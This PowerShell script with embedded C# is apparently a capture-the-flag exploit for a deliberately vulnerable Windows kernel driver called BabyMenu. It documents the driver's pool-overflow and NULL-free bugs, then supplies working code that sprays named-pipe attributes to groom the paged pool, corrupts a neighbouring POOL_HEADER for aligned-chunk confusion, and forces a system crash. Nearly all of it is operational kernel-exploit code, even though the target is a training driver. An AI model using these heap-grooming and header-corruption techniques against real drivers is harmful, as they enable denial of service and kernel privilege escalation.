<#
 12070 · BabyMenu — device probe / vulnerability PoC  (run as  ctfer, NO compiler needed)
 ==============================================================================
 Windows 11 26H1 (build 28000) ships  \Device\BabyMenu  via the auto-start service
 "ycb" (C:\Windows\System32\BabyMenu.sys, WDK-test-signed).  The driver is a
 non-PnP WDM driver created with plain IoCreateDevice + a \DosDevices symlink,
 so the user-mode path is  \\.\BabyMenu .

 IOCTLs (all METHOD_BUFFERED, FILE_ANY_ACCESS):
   0x222014  alloc : ExAllocatePool2(POOL_FLAG_PAGED=0x100, 0x120, 'ycb!')
                     (old pointer is silently leaked)
   0x222008  write : len = min(u64[in], 0x140)
                     ProbeForRead(*(void**)(in+8), len, 1)
                     memmove(g_buf, *(void**)(in+8), len)      <-- 0x20 overflow
   0x222004  free  : ExFreePoolWithTag(g_buf, 0); g_buf = NULL   (no NULL check)

 Modes
 -----
   (default)        safe probe: open device, alloc / write 0x120 / free, report.
   -OverflowPoC     sprays 0x120 paged-pool PipeAttributes, overflows the next
                    chunk's POOL_HEADER, then frees that chunk -> BSOD which
                    proves the overflow is real and reaches the neighbour header.
   -CrashPoC        alloc -> free -> free again  => ExFreePoolWithTag(NULL) BSOD.

 Exit codes: 0 = success, 1 = device not reachable (check the service), 2 = error.

 Usage:
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuProbe.ps1
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuProbe.ps1 -OverflowPoC
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuProbe.ps1 -CrashPoC
#>
[CmdletBinding()]
param(
    [switch]$OverflowPoC,
    [switch]$CrashPoC,
    [int]$SprayCount = 512
)

$ErrorActionPreference = 'Stop'

$cs = @'
using System;
using System.Runtime.InteropServices;

public static class BM
{
    public const uint GENERIC_READ      = 0x80000000;
    public const uint GENERIC_WRITE     = 0x40000000;
    public const uint OPEN_EXISTING     = 3;
    public const uint FILE_SHARE_RW     = 0x00000003;

    public const uint IOCTL_ALLOC = 0x222014;
    public const uint IOCTL_WRITE = 0x222008;
    public const uint IOCTL_FREE  = 0x222004;

    // FSCTL_PIPE_SET_ATTRIBUTE / FSCTL_PIPE_GET_ATTRIBUTE  (npfs)
    public const uint FSCTL_PIPE_SET_ATTRIBUTE = 0x11003C;
    public const uint FSCTL_PIPE_GET_ATTRIBUTE = 0x110038;

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr CreateFileW(string name, uint access, uint share,
                                            IntPtr sa, uint disposition,
                                            uint flags, IntPtr template);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(IntPtr h, uint code,
                                              byte[] inBuf, uint inLen,
                                              byte[] outBuf, uint outLen,
                                              out uint ret, IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(out IntPtr rd, out IntPtr wr,
                                         IntPtr sa, uint size);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);

    [DllImport("ntdll.dll")]
    public static extern int NtFsControlFile(IntPtr file, IntPtr evt, IntPtr apcR,
                                             IntPtr apcC, out int iosb,
                                             uint code, byte[] inBuf, uint inLen,
                                             byte[] outBuf, uint outLen);

    public static IntPtr OpenDevice()
    {
        IntPtr h = CreateFileW(@"\\.\BabyMenu", GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        return h;
    }

    public static int Ioctl(IntPtr h, uint code, byte[] inBuf, int inLen)
    {
        uint ret;
        bool ok = DeviceIoControl(h, code, inBuf, (uint)inLen, null, 0, out ret, IntPtr.Zero);
        if (!ok) return Marshal.GetLastWin32Error();
        return (int)ret;
    }

    // in-buffer for IOCTL_WRITE: { UINT64 len; UINT64 user_ptr; }
    public static int WritePool(IntPtr h, byte[] payload, int len)
    {
        var pinned = GCHandle.Alloc(payload, GCHandleType.Pinned);
        try
        {
            byte[] req = new byte[16];
            Buffer.BlockCopy(BitConverter.GetBytes((ulong)len), 0, req, 0, 8);
            Buffer.BlockCopy(BitConverter.GetBytes((ulong)pinned.AddrOfPinnedObject().ToInt64()), 0, req, 8, 8);
            return Ioctl(h, IOCTL_WRITE, req, req.Length);
        }
        finally { pinned.Free(); }
    }
}
'@

Add-Type -TypeDefinition $cs -Language CSharp

function New-Attr([int]$nameLen, [int]$valueLen) {
    # one pipe + one attribute whose *allocation* is 0x28 + nameLen + valueLen bytes
    $rd = [IntPtr]::Zero; $wr = [IntPtr]::Zero
    if (-not [BM]::CreatePipe([ref]$rd, [ref]$wr, [IntPtr]::Zero, 0x1000)) {
        throw "CreatePipe failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
    $name  = ('n' * ($nameLen - 1)) + "`0"
    $value = 'V' * $valueLen
    $buf   = [System.Text.Encoding]::ASCII.GetBytes($name + $value)
    $out   = New-Object byte[] 0x100
    $iosb  = 0
    $st = [BM]::NtFsControlFile($wr, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
                                [ref]$iosb, [BM]::FSCTL_PIPE_SET_ATTRIBUTE,
                                $buf, $buf.Length, $out, $out.Length)
    if ($st -ne 0) { throw ("NtFsControlFile(SET_ATTRIBUTE) = 0x{0:X8}" -f $st) }
    return [pscustomobject]@{ Rd = $rd; Wr = $wr; Name = $name.TrimEnd("`0") }
}

function Close-Attr($a) {
    if ($a.Rd -ne [IntPtr]::Zero) { [void][BM]::CloseHandle($a.Rd) }
    if ($a.Wr -ne [IntPtr]::Zero) { [void][BM]::CloseHandle($a.Wr) }
}

# ------------------------------------------------------------------ main
Write-Host "== 12070 BabyMenu probe ==" -ForegroundColor Cyan
$dev = [BM]::OpenDevice()
if ($dev -eq [IntPtr](-1) -or $dev -eq [IntPtr]::Zero) {
    $e = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Host ("[!] CreateFile(\\\\.\\BabyMenu) failed, Win32 error {0}" -f $e) -ForegroundColor Red
    Write-Host "    -> sc qc ycb ; sc query ycb ; check the device ACL"
    exit 1
}
Write-Host "[+] opened \\.\BabyMenu  (handle 0x{0:X})" -f $dev.ToInt64() -ForegroundColor Green

if ($CrashPoC) {
    Write-Host "[*] CrashPoC: alloc, free, free(NULL) -> expect BSOD (BAD_POOL_CALLER)" -ForegroundColor Yellow
    "alloc" | Out-Host; $r = [BM]::Ioctl($dev, [BM]::IOCTL_ALLOC, $null, 0); "  status=0x{0:X8}" -f $r | Out-Host
    "free#1" | Out-Host; $r = [BM]::Ioctl($dev, [BM]::IOCTL_FREE, $null, 0); "  status=0x{0:X8}" -f $r | Out-Host
    Write-Host "[*] second free: g_buf is NULL, driver calls ExFreePoolWithTag(NULL,0)" -ForegroundColor Yellow
    [void][BM]::Ioctl($dev, [BM]::IOCTL_FREE, $null, 0)
    Write-Host "[!] still alive - the box did not bugcheck (unexpected)" -ForegroundColor Red
    exit 2
}

# ---- safe probe
$r = [BM]::Ioctl($dev, [BM]::IOCTL_ALLOC, $null, 0)
Write-Host ("[*] IOCTL 0x222014 alloc  -> 0x{0:X8}" -f $r)
if ($r -ne 0) { Write-Host "[!] allocation refused"; exit 2 }

$payload = New-Object byte[] 0x140
for ($i = 0; $i -lt $payload.Length; $i++) { $payload[$i] = [byte]($i -band 0xFF) }
$r = [BM]::WritePool($dev, $payload, 0x120)
Write-Host ("[*] IOCTL 0x222008 write 288 (in bounds) -> 0x{0:X8}" -f $r)

if ($OverflowPoC) {
    Write-Host "[*] OverflowPoC: spraying $SprayCount PipeAttributes of allocation 0x120 (paged pool, LFH)" -ForegroundColor Yellow
    $spray = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $SprayCount; $i++) {
        # 0x28 header + name + value == 0x120 requested bytes
        [void]$spray.Add((New-Attr -nameLen 8 -valueLen (0x120 - 0x28 - 8)))
    }
    Write-Host "[+] sprayed $($spray.Count) attributes"

    # overwrite the first 4 bytes of the *next* chunk's POOL_HEADER:
    #   PreviousSize = 0x11  (fake header 0x110 before it, i.e. inside our buffer)
    #   PoolType    |= 4     (CacheAligned bit -> Aligned Chunk Confusion)
    # len = 0x124 touches nothing else, so PoolTag/ProcessBilled stay valid.
    $ov = New-Object byte[] 0x140
    # fake POOL_HEADER inside our own buffer at body offset 0x10 (BlockSize 0x21 = ghost 0x210)
    $ov[0x10] = 0x00; $ov[0x11] = 0x00; $ov[0x12] = 0x21; $ov[0x13] = 0x00
    # our data area
    for ($i = 0x00; $i -lt 0x120; $i++) { if ($i -lt 0x10 -or $i -ge 0x14) { $ov[$i] = 0x43 } }
    # next chunk's POOL_HEADER, bytes 0..3
    $ov[0x120] = 0x11; $ov[0x121] = 0x00; $ov[0x122] = 0x00; $ov[0x123] = 0x0F
    $r = [BM]::WritePool($dev, $ov, 0x124)
    Write-Host ("[*] IOCTL 0x222008 write 292 (overflow into neighbour header) -> 0x{0:X8}" -f $r)

    Write-Host "[*] freeing sprayed attributes -> the corrupted one should trigger a fake free"
    foreach ($a in $spray) { Close-Attr $a }
    Write-host "[!] survived: the overflowed chunk's header probably was not followed by a sprayed chunk"
    exit 2
}

$r = [BM]::Ioctl($dev, [BM]::IOCTL_FREE, $null, 0)
Write-Host ("[*] IOCTL 0x222004 free   -> 0x{0:X8}" -f $r)
[void][BM]::CloseHandle($dev)
Write-Host "[OK] access + IOCTL reachability confirmed for the current user" -ForegroundColor Green
Write-Host "     (whoami: $(whoami))"
exit 0
